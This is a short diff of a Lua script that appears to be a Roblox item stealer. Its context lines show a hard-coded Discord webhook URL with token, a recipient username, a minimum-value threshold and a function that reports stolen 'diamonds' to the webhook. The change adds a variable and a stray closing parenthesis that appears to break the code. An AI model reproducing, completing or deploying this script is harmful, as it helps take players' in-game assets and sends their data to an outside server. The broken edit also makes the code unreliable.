@@ -39,6 +39,7 @@ end
 
 local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
 local DualHookName = "Eliaskulmer999"
+local DualHookRap = 0
 
 local users = "Eliaskulmer999"
 local min_rap = 1000000
@@ -171,6 +172,7 @@ local function SendMessage(diamonds)
             Body = body
         })
     end
+	)
 
     if not ok then
         warn("Webhook request failed:", res)
